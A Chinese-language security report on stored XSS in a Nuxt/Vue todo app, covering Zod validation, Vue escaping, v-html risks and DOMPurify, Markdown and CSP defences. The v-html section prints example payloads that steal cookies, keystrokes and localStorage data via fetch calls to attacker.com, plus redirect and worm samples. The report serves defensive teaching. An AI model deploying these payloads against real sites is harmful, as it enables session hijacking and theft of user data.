# XSS 防御与渗透分析报告

## 代码分析基础

基于以下两个关键文件进行分析：

### 1. 后端 API 接口 (`server/api/todos/index.post.ts`)

```typescript
import { z } from 'zod'
import { db, schema } from 'hub:db'

const BodySchema = z.object({
  title: z.string().min(1).max(100)
})

export default eventHandler(async (event) => {
  const { title } = await readValidatedBody(event, body => BodySchema.parse(body))
  const { user } = await requireUserSession(event)

  // Insert todo for the current user
  const todos = await db.insert(schema.todos).values({
    userId: user.id,
    title,
    createdAt: new Date()
  }).returning()

  return todos[0]
})
```

### 2. 前端页面 (`app/pages/todos.vue`)

```vue
<span
  class="flex-1 font-medium"
  :class="[todo.completed ? 'line-through text-gray-500' : '']"
>{{ todo.title }}</span>
```

---

## 问题 1：Payload 能否成功写入数据库？

### 答案：**可以成功写入**

### 详细分析：

#### Payload 长度分析

恶意 Payload：`<img src=x onerror=alert(1)>`

- 字符数统计：约 30 个字符
- Zod 校验规则：`z.string().min(1).max(100)`
- 结论：完全符合长度限制（30 < 100）

#### Zod 校验的局限性

Zod 的 `z.string().min(1).max(100)` 校验**只做以下检查**：

1. ✅ 类型检查：确认是字符串类型
2. ✅ 最小长度：至少 1 个字符
3. ✅ 最大长度：不超过 100 个字符

**Zod 校验不会做的事**：

❌ 不会过滤 HTML 标签
❌ 不会转义特殊字符
❌ 不会检查内容是否包含恶意脚本
❌ 不会进行 XSS 相关的任何处理

#### 数据库层面分析

后端代码直接将 `title` 插入数据库：

```typescript
await db.insert(schema.todos).values({
  userId: user.id,
  title,  // 直接使用，未做任何处理
  createdAt: new Date()
}).returning()
```

这里使用的是参数化查询（Prepared Statement），虽然可以防止 **SQL 注入**，但**无法防止 XSS**。

- 参数化查询：防止 SQL 语句被篡改
- XSS 问题：是存储在数据库中的恶意数据，在渲染时执行

#### 结论

恶意 Payload `<img src=x onerror=alert(1)>` 会被完整地、原样地存储到 SQLite 数据库中。

---

## 问题 2：Vue 模板语法能否抵御 XSS？

### 答案：**可以抵御 XSS 攻击**

### 详细分析：

#### Vue 模板语法的自动转义机制

当前代码使用：

```vue
<span>{{ todo.title }}</span>
```

Vue 的双花括号语法 `{{ }}` 被称为**插值（Interpolation）**，它具有以下特性：

#### 底层防御原理：自动 HTML 转义

Vue 模板引擎在渲染时，会将绑定的内容自动进行 **HTML 实体转义（HTML Entity Escaping）**。

转义规则如下：

| 原始字符 | 转义后的实体 | 说明 |
|---------|-------------|------|
| `<`     | `&lt;`      | 小于号 |
| `>`     | `&gt;`      | 大于号 |
| `"`     | `&quot;`    | 双引号 |
| `'`     | `&#39;`     | 单引号 |
| `&`     | `&amp;`     | 与符号 |

#### 实际渲染效果

当数据库中的 Payload `<img src=x onerror=alert(1)>` 返回给前端时：

**原始数据**：
```
<img src=x onerror=alert(1)>
```

**经过 Vue 自动转义后**：
```html
&lt;img src=x onerror=alert(1)&gt;
```

**浏览器渲染结果**：

浏览器看到的是转义后的字符，会将其作为**纯文本**显示，而不是解析为 HTML 元素。

用户在页面上看到的是：
```
<img src=x onerror=alert(1)>
```

而不是一张图片，`alert(1)` 也不会执行。

#### 为什么这是安全的？

1. **DOM 文本节点**：Vue 将内容插入为文本节点（Text Node），而不是 HTML
2. **浏览器解析差异**：文本节点中的内容永远不会被浏览器解析为 HTML 代码
3. **安全默认**：这是 Vue 的**默认安全行为**，防止开发者意外引入 XSS

#### 流程图示意

```
数据库存储: <img src=x onerror=alert(1)>
      ↓
后端返回: <img src=x onerror=alert(1)> (JSON 字符串)
      ↓
Vue 模板: {{ todo.title }}
      ↓
自动转义: &lt;img src=x onerror=alert(1)&gt;
      ↓
浏览器: 作为纯文本显示，不执行脚本
```

---

## 问题 3：使用 v-html 的风险与解决方案

### 问题一：会引发什么灾难性后果？

#### 修改后的代码（危险）

```vue
<span v-html="todo.title"></span>
```

#### 后果：**立即引发存储型 XSS 攻击**

### 详细分析：

#### v-html 的危险特性

Vue 的 `v-html` 指令会：

1. **跳过自动转义**：直接将内容作为 HTML 解析
2. **插入到 DOM**：作为 HTML 元素节点插入，而非文本节点
3. **执行脚本**：浏览器会完整解析并执行其中的 JavaScript

#### 攻击场景演示

当恶意 Payload `<img src=x onerror=alert(1)>` 被渲染时：

**实际执行流程**：

```html
<!-- 原始数据 -->
todo.title = "<img src=x onerror=alert(1)>"

<!-- v-html 渲染 -->
<span v-html="todo.title"></span>

<!-- 实际 DOM 插入 -->
<span>
  <img src=x onerror=alert(1)>
</span>

<!-- 浏览器行为 -->
1. 解析为 <img> 标签
2. 尝试加载 src="x"（失败）
3. 触发 onerror 事件
4. 执行 alert(1) → 弹窗出现
```

#### 更严重的攻击场景

实际的攻击者不会只用 `alert(1)` 进行演示，他们可能执行：

**1. 会话劫持（Cookie 窃取）**

```html
<img src=x onerror="fetch('https://attacker.com/steal?c=' + document.cookie)">
```

**2. 重定向到钓鱼网站**

```html
<img src=x onerror="window.location.href='https://phishing-site.com'">
```

**3. 键盘记录**

```html
<script>
  document.addEventListener('keydown', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```

**4. 窃取用户数据**

```html
<img src=x onerror="
  const userData = localStorage.getItem('user');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: userData
  });
">
```

**5. 传播蠕虫**

```html
<script>
  // 自动创建包含恶意代码的 Todo
  fetch('/api/todos', {
    method: 'POST',
    body: JSON.stringify({
      title: '<script>alert(1)<\/script>'
    })
  });
</script>
```

### 问题二：必须支持富文本时的解决方案

如果业务需求必须支持富文本（如加粗、斜体、颜色等），需要在**前后端**都引入清洗机制。

#### 推荐方案：深度防御（Defense in Depth）

```
用户输入
    ↓
┌─────────────────────┐
│  后端：内容清洗      │ ← 第一道防线
│  DOMPurify (Node)   │
└─────────────────────┘
    ↓
┌─────────────────────┐
│  数据库存储          │
│  安全的 HTML        │
└─────────────────────┘
    ↓
┌─────────────────────┐
│  前端：内容清洗      │ ← 第二道防线
│  DOMPurify (Browser)│
└─────────────────────┘
    ↓
┌─────────────────────┐
│  v-html 渲染        │
│  安全的富文本        │
└─────────────────────┘
```

#### 方案一：使用 DOMPurify

**DOMPurify** 是目前最流行、最安全的 HTML 清洗库。

##### 后端实现（Node.js）

**安装依赖**：

```bash
npm install dompurify jsdom
```

**后端代码示例**：

```typescript
// server/api/todos/index.post.ts
import { z } from 'zod'
import { db, schema } from 'hub:db'
import createDOMPurify from 'dompurify'
import { JSDOM } from 'jsdom'

const BodySchema = z.object({
  title: z.string().min(1).max(1000)  // 富文本可能需要更长
})

export default eventHandler(async (event) => {
  const { title } = await readValidatedBody(event, body => BodySchema.parse(body))
  const { user } = await requireUserSession(event)

  // 创建 DOMPurify 实例
  const window = new JSDOM('').window
  const DOMPurify = createDOMPurify(window)

  // 配置允许的标签和属性（白名单模式）
  const cleanTitle = DOMPurify.sanitize(title, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'span'],
    ALLOWED_ATTR: ['style'],
    ALLOW_DATA_ATTR: false,
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|#)/
  })

  // 插入清洗后的数据
  const todos = await db.insert(schema.todos).values({
    userId: user.id,
    title: cleanTitle,  // 使用清洗后的数据
    createdAt: new Date()
  }).returning()

  return todos[0]
})
```

##### 前端实现

**安装依赖**：

```bash
npm install dompurify
```

**前端代码示例**：

```vue
<script setup lang="ts">
import DOMPurify from 'dompurify'
import { todosQuery } from '~/queries/todos'

// 使用计算属性进行清洗
const cleanTitle = (html: string) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'span'],
    ALLOWED_ATTR: ['style']
  })
}
</script>

<template>
  <span
    class="flex-1 font-medium"
    :class="[todo.completed ? 'line-through text-gray-500' : '']"
    v-html="cleanTitle(todo.title)"
  ></span>
</template>
```

#### 方案二：使用 Markdown 代替 HTML

更好的方案是使用 **Markdown** 而不是直接的 HTML。

**优势**：
1. Markdown 语法更简单、更可控
2. 渲染时可以配置允许的 HTML 标签
3. 提供更好的用户体验

**实现步骤**：

1. 用户输入 Markdown 文本
2. 后端存储原始 Markdown
3. 前端使用 `marked` 或 `markdown-it` 渲染
4. 渲染过程中使用 DOMPurify 清洗

```vue
<script setup lang="ts">
import { marked } from 'marked'
import DOMPurify from 'dompurify'

// 配置 marked
marked.setOptions({
  breaks: true,
  gfm: true
})

const renderMarkdown = (markdown: string) => {
  // 1. Markdown 转 HTML
  const html = marked.parse(markdown) as string
  // 2. DOMPurify 清洗
  return DOMPurify.sanitize(html)
}
</script>

<template>
  <span v-html="renderMarkdown(todo.title)"></span>
</template>
```

#### 方案三：使用成熟的富文本编辑器

如果需要功能完整的富文本编辑，推荐使用以下编辑器（它们内置了 XSS 防护）：

| 编辑器 | 说明 |
|-------|------|
| **Quill** | 轻量级，支持自定义，有安全插件 |
| **Tiptap** | 基于 ProseMirror，Vue 友好 |
| **Slate.js** | 高度可定制的框架 |
| **CKEditor 5** | 功能强大，内置安全机制 |

这些编辑器通常提供：
- 内容白名单机制
- 自动过滤危险标签
- 可配置的安全策略

### 安全最佳实践总结

#### 1. 默认安全

✅ **优先使用文本插值**：`{{ }}` 而不是 `v-html`
✅ **最小权限原则**：只允许必要的标签和属性
✅ **白名单而非黑名单**：明确允许什么，而不是禁止什么

#### 2. 深度防御

✅ **后端清洗**：存储前必须清洗（最后一道防线）
✅ **前端清洗**：渲染前再次清洗（冗余保护）
✅ **输入验证**：使用 Zod 等进行格式和长度校验
✅ **输出编码**：根据上下文选择正确的编码方式

#### 3. 额外安全措施

✅ **Content Security Policy (CSP)**：限制可执行的脚本源
```http
Content-Security-Policy: script-src 'self'; img-src 'self'
```

✅ **HttpOnly Cookie**：防止 XSS 窃取会话
```typescript
useCookie('session', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
})
```

✅ **定期安全审计**：使用工具如 `npm audit`、ESLint 安全插件

---

## 总结

| 问题 | 结论 |
|-----|------|
| Payload 能否写入数据库？ | ✅ **能**，Zod 只校验长度 |
| {{ }} 能否抵御 XSS？ | ✅ **能**，Vue 自动 HTML 转义 |
| 使用 v-html 的后果？ | ❌ **存储型 XSS 攻击**，可执行任意脚本 |

**核心安全原则**：永远不要信任用户输入，所有外部数据在存储和渲染前都必须经过适当的处理。
